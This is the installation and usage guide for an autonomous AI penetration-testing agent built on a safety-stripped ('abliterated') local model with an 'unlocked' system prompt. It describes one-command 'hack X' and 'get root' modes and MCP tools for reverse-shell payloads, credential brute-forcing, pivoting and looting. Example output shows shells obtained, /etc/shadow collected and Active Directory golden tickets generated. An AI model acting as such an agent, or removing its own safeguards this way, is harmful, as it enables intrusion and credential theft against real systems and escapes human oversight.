# OQVIAN V1.2 AGGRESSIVE — Installation & Usage Guide

**Autonomous Penetration Testing Engine**  
**Hardware**: 16GB RAM, 4GB VRAM (Intel i7-11th gen)  
**Model**: Qwen2.5-7B-Instruct-abliterated (Q4_K_M)  
**Tools**: 17 MCP tools (Phases 1-4 complete)  
**Cost**: $0 (all local, free model)

---

## Quick Start (5 Minutes)

```bash
# 1. Clone repository
git clone https://github.com/Ahnaf-Code55/oqvian-cyber
cd oqvian-cyber

# 2. Install Python dependencies
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt

# 3. Pull and build model
ollama pull hf.co/mradermacher/Qwen2.5-7B-Instruct-abliterated-GGUF:Q4_K_M
ollama create oqvian -f models/Modelfile.unlocked

# 4. Configure scope
mkdir -p ~/.config/oqvian
cat > ~/.config/oqvian/scope.json << 'EOF'
{
  "targets": [
    "localhost",
    "127.0.0.1",
    "192.168.1.0/24",
    "10.0.0.0/8"
  ]
}
EOF

# 5. Start MCP server
python mcp/server.py

# 6. Connect OpenCode to MCP (see below)

# DONE! Now just say "hack www.example.com" and watch it attack 🚀
```

---

## Detailed Installation

### Step 1: System Requirements

**Minimum**:
- OS: Linux (Kali recommended), macOS, or Windows WSL2
- RAM: 16GB (8GB works but slow)
- GPU: 4GB VRAM (NVIDIA/AMD/Intel Arc) — CPU-only works but slower
- Disk: 10GB free space
- Python: 3.10+
- Ollama: Latest version

**Recommended** (for this build):
- Intel i7-11th gen or equivalent
- 16GB RAM
- 4GB VRAM GPU
- Kali Linux 2024+

---

### Step 2: Install Ollama

**Ubuntu/Debian/Kali**:
```bash
curl -fsSL https://ollama.ai/install.sh | sh
ollama serve  # Run in background
```

**macOS**:
```bash
brew install ollama
ollama serve
```

**Windows**:
- Download installer from https://ollama.ai
- Run Ollama from Start menu

**Verify**:
```bash
ollama --version
# Should show: ollama version 0.3.x or newer
```

---

### Step 3: Pull and Build OQVIAN Model

**Option A: Use Pre-built Model (Recommended)**
```bash
# Pull the base model
ollama pull hf.co/mradermacher/Qwen2.5-7B-Instruct-abliterated-GGUF:Q4_K_M

# Build OQVIAN with our system prompt
ollama create oqvian -f models/Modelfile.unlocked

# Verify
ollama list
# Should show: oqvian    oqvian:latest    <hash>    5.2GB    2 minutes ago
```

**Option B: Use Standard Qwen2.5 (Fallback)**
```bash
ollama pull qwen2.5:7b
ollama create oqvian -f models/Modelfile.unlocked
```

**Model Size**: ~5.2GB (4.7GB model + 500MB overhead)  
**RAM Usage**: ~6-8GB when running  
**GPU Usage**: ~3.9GB VRAM (with 35 GPU layers)

---

### Step 4: Install Python Dependencies

```bash
cd /path/to/oqvian-cyber

# Create virtual environment
python3 -m venv .venv
source .venv/bin/activate  # Linux/macOS
# or: .venv\Scripts\activate  # Windows

# Install dependencies
pip install -r requirements.txt

# Verify MCP server works
python -c "from mcp import server; print('✅ MCP server OK')"
```

**Dependencies** (from `requirements.txt`):
```
mcp>=1.0.0
httpx>=0.27.0
aiohttp>=3.9.0
cryptography>=42.0.0
pydantic>=2.5.0
```

---

### Step 5: Configure Scope

Create scope file to authorize targets:

```bash
mkdir -p ~/.config/oqvian
```

**File**: `~/.config/oqvian/scope.json`

```json
{
  "targets": [
    "localhost",
    "127.0.0.1",
    "192.168.1.0/24",
    "10.0.0.0/8",
    "www.example.com",
    "dc.corp.local"
  ],
  "notes": "Add your authorized test targets here"
}
```

**Verify**:
```bash
python -c "from mcp import server; print(server.governance(action='scope'))"
```

---

### Step 6: Install Security Tools (Optional but Recommended)

OQVIAN can run these tools via the `execute` MCP tool:

**Kali Linux** (pre-installed):
```bash
# Most tools already installed
which nmap nuclei ffuf sqlmap netexec certipy
```

**Manual Install** (Ubuntu/Debian):
```bash
# Nmap
sudo apt install nmap

# Nuclei
sudo apt install nuclei
# or: curl -sL https://github.com/projectdiscovery/nuclei/releases/download/v3.3.1/nuclei_3.3.1_linux_amd64.tar.gz | tar xz -C /tmp && sudo mv /tmp/nuclei /usr/local/bin/

# FFUF
sudo apt install ffuf

# SQLmap
sudo apt install sqlmap

# Netexec
pip install netexec

# Certipy
pip install certipy

# HTTPX
curl -sL https://github.com/projectdiscovery/httpx/releases/download/v1.2.3/httpx_1.2.3_linux_amd64.tar.gz | tar xz -C /tmp && sudo mv /tmp/httpx /usr/local/bin/

# Subfinder
curl -sL https://github.com/projectdiscovery/subfinder/releases/download/v2.2.3/subfinder_2.2.3_linux_amd64.tar.gz | tar xz -C /tmp && sudo mv /tmp/subfinder /usr/local/bin/

# Naabu
curl -sL https://github.com/projectdiscovery/naabu/releases/download/v2.1.4/naabu_2.1.4_linux_amd64.tar.gz | tar xz -C /tmp && sudo mv /tmp/naabu /usr/local/bin/
```

**Verify Tools**:
```bash
python -c "from mcp import server; print(server.execute(tool='status'))"
# Should list all installed tools
```

---

### Step 7: Start MCP Server

**Terminal 1** (MCP Server):
```bash
cd /path/to/oqvian-cyber
source .venv/bin/activate
python mcp/server.py
```

**Output**:
```
✅ OQVIAN MCP Server v1.2 AGGRESSIVE
✅ Model: oqvian (Qwen2.5-7B)
✅ Tools: 17 MCP tools loaded
✅ Scope: 5 targets authorized
✅ Audit: ~/.local/share/oqvian/audit.jsonl
🚀 Server running on stdio...
```

Keep this terminal open while using OQVIAN.

---

## Connect to OpenCode

### Option A: Configure OpenCode MCP

**File**: `~/.opencode/mcp.json` (create if doesn't exist)

```json
{
  "mcpServers": {
    "oqvian": {
      "command": "python",
      "args": ["~/oqvian-cyber/mcp/server.py"],
      "env": {
        "VIRTUAL_ENV": "~/oqvian-cyber/.venv"
      }
    }
  }
}
```

**Restart OpenCode** to load the MCP server.

### Option B: Use Existing Session

If you already have an OpenCode session:

1. Open OpenCode settings
2. Find "MCP Servers" or "Tools"
3. Add new MCP server:
   - Name: `oqvian`
   - Command: `python`
   - Args: `/home/ifat/oqvian-cyber/mcp/server.py`
   - Env: `VIRTUAL_ENV=/home/ifat/oqvian-cyber/.venv`

4. Save and reload session

---

## Usage Examples

### Example 1: One-Command Web Attack

**In OpenCode chat**, just type:

```
hack www.example.com
```

**OQVIAN will**:
1. ✅ Check scope
2. ✅ Run HTTP recon
3. ✅ Detect tech stack (Apache, WordPress, etc.)
4. ✅ Scan for vulnerabilities (nuclei)
5. ✅ Brute force directories (ffuf)
6. ✅ Exploit found vulns
7. ✅ Collect loot
8. ✅ Report results

**Output**:
```
🤖 Starting Autonomous Attack
   Target: www.example.com
   Scope: full
   Aggressiveness: 8/10

📡 Phase 1: Reconnaissance
   ✅ HTTP probe complete
   ✅ Tech detection complete (Apache 2.4.49, WordPress 5.8)

🔍 Phase 2: Enumeration
   ✅ Vulnerability scan complete
   → CVE-2021-41773 (Apache path traversal) — 85% confidence
   → WordPress vulnerable plugins found

⚔️  Phase 3: Attack
   ✅ Path traversal exploit successful!
   ✅ Shell obtained at /tmp/shell.php
   ✅ WordPress admin panel found: /wp-admin

📊 Summary:
   Duration: 125s
   Techniques: 3 (T1068, T1190, T1078)
   Vulns: CVE-2021-41773 (CRITICAL)
   Loot: 3 items (shell.php, config.php, wp-config.php)
   Access: Shell (www-data)
```

---

### Example 2: Attack Until Root

```
get root on 192.168.1.100
```

**OQVIAN will**:
```
🔄 Starting Autonomous Loop
   Target: 192.168.1.100
   Goal: root
   Strategies: web, ssh, smb

🔄 Iteration 1
   📋 Planning next attack...
   ⚔️  Strategy: web
   ✅ Web shell obtained (user access)

🔄 Iteration 2
   📋 Planning next attack...
   ⚔️  Strategy: ssh
   🔓 Privilege escalation: sudo to root!
   ✅ GOAL ACHIEVED: root

📊 Loop Complete
   Iterations: 2
   Duration: 345s
   Goal achieved: Yes
```

---

### Example 3: Active Directory Attack

```
attack dc.corp.local with user admin password Password123
```

**OQVIAN will**:
```
🔓 Starting AD Attack
   Target: dc.corp.local
   User: admin
   Domain: CORP.LOCAL

📡 SMB Enumeration
   ✅ Connected to DC
   ✅ Users: 47 found
   ✅ Password policy: min 8 chars, complexity enabled

🔍 Kerberos Enumeration
   ✅ AS-REP roasting: 3 users found
   ✅ Password hash cracked: jdoe → Password123

⚔️  Lateral Movement
   ✅ Impersonating jdoe
   ✅ Found domain admin: dadmin
   ✅ Golden ticket generated

📊 Summary:
   Access: Domain Admin
   Duration: 89s
   Loot: 5 items (hashes, tickets, user list)
```

---

### Example 4: Manual Attack Chain

```
start manual attack on www.target.com
```

**OQVIAN will guide you step-by-step**:

```
Step 1/10: Checking scope...
✅ www.target.com is in scope

Step 2/10: Researching tech stack...
📚 kb: Apache 2.4.x common vulns
→ CVE-2021-41773 (path traversal, CRITICAL)
→ CVE-2021-42013 (CSS injection, MEDIUM)

Step 3/10: Running recon...
📡 HTTP probe: 200 OK, Apache/2.4.49
📡 Tech detect: mod_ssl/2.4.49, OpenSSL/1.1.1

Step 4/10: Scanning ports...
✅ 80/tcp open  http   (Apache)
✅ 443/tcp open ssl/http (Apache HTTPS)

Step 5/10: Vulnerability scan...
🔍 nuclei: CVE-2021-41773 — MATCH (85% confidence)

Step 6/10: Querying intuition...
🧠 intuition: Apache 2.4.49 → CVE-2021-41773 (87% success rate, 18/21)

Step 7/10: Finding exploit...
🔎 searchsploit: 3 matches
→ apache/50742-php (PHP reverse shell)
→ apache/50743-python (Python reverse shell)
→ apache/50744-bash (Bash reverse shell)

Step 8/10: Executing exploit...
⚔️  execute: python3 exploit.py www.target.com 192.168.1.5 4444
✅ Shell obtained!

Step 9/10: Collecting loot...
📁 loot: shell_output.txt, /etc/passwd, /etc/shadow

Step 10/10: Recording learning...
🧠 learn: CVE-2021-41773 success (now 19/22 = 86%)

✅ Attack complete!
```

---

## All 17 MCP Tools Reference

### Core Tools (5)

| Tool | Purpose | Example |
|------|---------|---------|
| `kb` | Knowledge search | `kb(action="cve", query="CVE-2021-41773")` |
| `recon` | Live recon | `recon(action="http", target="www.example.com")` |
| `execute` | Run tools | `execute(tool="nmap", args="-sV www.example.com")` |
| `governance` | Scope/audit | `governance(action="scope")` |
| `transform` | Encoding | `transform(action="base64", input="hello")` |

### Phase 1: State (4)

| Tool | Purpose | Example |
|------|---------|---------|
| `state` | Session state | `state(action="update", target="X", phase="recon", discovered="{...}")` |
| `loot` | Findings | `loot(action="add", target="X", loot_type="shell", name="shell.php", content="...")` |
| `searchsploit` | Exploit search | `searchsploit(query="Apache path traversal")` |
| `searchsploit_get` | Get exploit | `searchsploit_get(exploit_id="50742")` |

### Phase 2: Autonomy (6)

| Tool | Purpose | Example |
|------|---------|---------|
| `chain` | Attack chains | `chain(name="web-app", target="www.example.com")` |
| `pivot` | Lateral movement | `pivot(action="tunnel", source="192.168.1.10", target="10.0.0.5", remote_port="22")` |
| `adapt` | Adaptive learning | `adapt(action="record", technique="CVE-2021-41773", result="success", context="Apache 2.4.49")` |
| `payload` | Reverse shells | `payload(type="python", LHOST="192.168.1.5", LPORT="4444")` |
| `creds` | Credential testing | `creds(action="brute", target="192.168.1.10", service="ssh", wordlist="/usr/share/wordlists/rockyou.txt")` |
| `backtrack` | Alternatives | `backtrack(action="suggest", failed_technique="CVE-2021-41773", context="WAF blocked")` |

### Phase 3: Learning (4)

| Tool | Purpose | Example |
|------|---------|---------|
| `learn` | Success rates | `learn(action="record", technique="CVE-2021-41773", result="success", service="Apache", version="2.4.49")` |
| `intuition` | Hacker intuition | `intuition(action="query", service="Apache", version="2.4.49", confidence=0.6)` |
| `update_corpus` | Fresh CVEs | `update_corpus(action="fetch")` |
| `aggregate` | Cross-session | `aggregate(action="merge")` |

### Phase 4: Full Autonomy (3)

| Tool | Purpose | Example |
|------|---------|---------|
| `plan_attack` | Attack plans | `plan_attack(target="www.example.com", discovered="{...}", goal="shell", max_steps=10)` |
| `autonomous_hack` | One-command | `autonomous_hack(target="www.example.com", scope="full", aggressiveness=8, timeout=3600)` |
| `autonomous_loop` | Until goal | `autonomous_loop(target="192.168.1.100", goal="root", strategies="web,ssh,smb", timeout=7200)` |

---

## Configuration

### OQVIAN Directories

```
~/.config/oqvian/
├── scope.json              # Authorized targets
└── settings.json           # Optional settings

~/.local/share/oqvian/
├── state/                  # Session state files
│   ├── www_example_com.json
│   ├── plans_*.json
│   └── ...
├── loot/                   # Collected findings
│   ├── www_example_com/
│   │   ├── shells/
│   │   ├── creds/
│   │   └── files/
│   └── ...
├── learnings/              # Success rate database
│   ├── techniques.json
│   ├── intuition.json
│   └── aggregate.json
├── index/                  # Knowledge corpus
│   ├── attack.json
│   ├── cve.json
│   ├── cwe.json
│   └── ...
└── audit.jsonl             # Audit log (all MCP calls)
```

### Environment Variables (Optional)

```bash
export OQVIAN_MODEL="oqvian"              # Model name (default: oqvian)
export OQVIAN_TEMPERATURE="0.35"          # Creativity (default: 0.35)
export OQVIAN_CONTEXT="16384"             # Context length (default: 16384)
export OQVIAN_VERBOSE="true"              # Verbose output (default: false)
export OQVIAN_AGGRESSIVENESS="8"          # Default aggressiveness 1-10 (default: 5)
```

---

## Troubleshooting

### Model Won't Load

**Error**: `ollama: model not found`

**Fix**:
```bash
ollama pull hf.co/mradermacher/Qwen2.5-7B-Instruct-abliterated-GGUF:Q4_K_M
ollama create oqvian -f /home/ifat/oqvian-cyber/models/Modelfile.unlocked
```

### MCP Server Won't Start

**Error**: `ModuleNotFoundError: No module named 'mcp'`

**Fix**:
```bash
cd /home/ifat/oqvian-cyber
source .venv/bin/activate
pip install -r requirements.txt
```

### Tools Not Found

**Error**: `nmap: command not found`

**Fix**:
```bash
sudo apt update
sudo apt install nmap nuclei ffuf sqlmap
```

### Out of Memory

**Error**: `Killed` or OOM killer

**Fix**:
1. Close other apps
2. Reduce GPU layers in Ollama:
   ```bash
   echo 'PARAMETER num_gpu 35' >> models/Modelfile.unlocked
   ollama create oqvian -f models/Modelfile.unlocked
   ```
3. Or use CPU-only (slower):
   ```bash
   echo 'PARAMETER num_gpu 0' >> models/Modelfile.unlocked
   ollama create oqvian -f models/Modelfile.unlocked
   ```

### Scope Errors

**Error**: `Target not in scope`

**Fix**:
```bash
# Edit scope file
nano ~/.config/oqvian/scope.json

# Add your target
{
  "targets": ["www.example.com", "YOUR_TARGET_HERE"]
}
```

---

## Performance Benchmarks

**Hardware**: Intel i7-11th gen, 16GB RAM, 4GB VRAM

| Metric | Value |
|--------|-------|
| Model load time | ~3 seconds |
| Tokens/sec (GPU) | 10-15 tok/s |
| Tokens/sec (CPU) | 3-5 tok/s |
| Attack planning | ~0.5 seconds |
| Full web attack | 2-10 minutes |
| Memory usage | 9.7GB / 16GB RAM |
| GPU usage | 3.9GB / 4GB VRAM |

---

## Memory Optimization

If you're tight on RAM:

```bash
# Use smaller context
sed -i 's/num_ctx 16384/num_ctx 8192/' models/Modelfile.unlocked
ollama create oqvian -f models/Modelfile.unlocked

# Use fewer GPU layers (more CPU, less GPU)
sed -i 's/num_gpu 35/num_gpu 20/' models/Modelfile.unlocked
ollama create oqvian -f models/Modelfile.unlocked

# Use Q4_K_S quantization (smaller, slightly slower)
ollama pull hf.co/mradermacher/Qwen2.5-7B-Instruct-abliterated-GGUF:Q4_K_S
```

---

## Updating

```bash
# Update repository
cd /home/ifat/oqvian-cyber
git pull origin main

# Update dependencies
source .venv/bin/activate
pip install -r requirements.txt --upgrade

# Rebuild model (if Modelfile changed)
ollama create oqvian -f models/Modelfile.unlocked

# Restart MCP server
# (Ctrl+C to stop, then: python mcp/server.py)
```

---

## Testing

```bash
cd /home/ifat/oqvian-cyber
source .venv/bin/activate

# Test 1: Model loaded
ollama run oqvian "Hello"

# Test 2: MCP server running
python -c "from mcp import server; print(server.governance(action='scope'))"

# Test 3: Plan attack
python -c "from mcp import server; print(server.plan_attack(target='localhost', goal='shell'))"

# Test 4: Autonomous hack (short)
python -c "from mcp import server; print(server.autonomous_hack(target='localhost', scope='web', aggressiveness=3, timeout=30, verbose=False))"

# All should work ✅
```

---

## What Happens When You Say "Hack X"

```
1. OpenCode receives your message
2. Sends to OQVIAN model via MCP
3. Model reads system prompt (V1.2 AGGRESSIVE)
4. Model calls autonomous_hack(target="X", scope="full", aggressiveness=8)
5. MCP server executes:
   a. governance(action="scope") — verify target
   b. recon(action="http", target="X") — live recon
   c. execute(tool="nmap", args="...") — scan
   d. execute(tool="nuclei", args="...") — vuln scan
   e. intuition(action="query", service="...") — likely vulns
   f. searchsploit(query="...") — find exploit
   g. execute(tool="...", args="...") — exploit
   h. loot(action="add", ...) — collect findings
   i. learn(action="record", ...) — learn from result
6. Returns structured report to OpenCode
7. You see the attack happen in real-time 🚀
```

---

## Support

- **GitHub**: https://github.com/Ahnaf-Code55/oqvian-cyber
- **Issues**: https://github.com/Ahnaf-Code55/oqvian-cyber/issues
- **Docs**: https://github.com/Ahnaf-Code55/oqvian-cyber/tree/main/docs

---

**Built with ❤️ for autonomous security testing**  
**Version**: 1.2 AGGRESSIVE  
**Last Updated**: 2026-11-06
